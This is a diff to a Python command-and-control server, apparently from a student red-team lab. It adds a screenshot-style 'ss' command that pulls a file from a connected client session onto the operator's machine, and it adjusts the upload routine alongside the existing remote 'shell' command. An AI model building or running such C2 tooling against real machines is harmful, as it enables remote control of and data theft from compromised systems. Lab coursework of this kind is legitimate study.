@@ -21,6 +21,18 @@ server_socket.bind((SERVER_HOST, SERVER_PORT))
 server_socket.listen(5)
 # print(f"Server listening on {SERVER_HOST}:{SERVER_PORT}")
 
+def ss(session):
+    client_socket = connections[session]['socket']
+    path = client_socket.recv(1024).decode()
+    print("recieved path")  #TODO DELETE
+    print(path) #TODO DELETE
+
+    download_path = 'C:\\Users\\Ziya\\Desktop\\study\\AKM\\RED\\python for red\\lab\\final\\Command-Control\\ss'
+
+    download(from_=path, where=download_path, session=session)
+    print("done!")
+
+
 def shell(session):
 
     conn = connections[session]['socket']
@@ -94,6 +106,8 @@ def use(session):
                     upload(what=command[1], where=command[2], session=session)
                 case 'shell':
                     shell(session=session)
+                case 'ss':
+                    ss(session=session)
                 case 'help':
                     session_help()
                 
@@ -136,7 +150,7 @@ def download(from_, where, session):
 
 def upload(what, where, session):
     socket = connections[session]['socket']
-    socket.send(where.encode())
+    # socket.send(where.encode())
     time.sleep(0.3)
     file_name = what.split('\\')[-1]
     socket.send(file_name.encode())
@@ -145,7 +159,7 @@ def upload(what, where, session):
     while a:
         socket.send(a)
         a = file.read(4096)
-    time.sleep(0.3)
+    time.sleep(1)
     socket.send(b"\n\r")
     file.close()
 
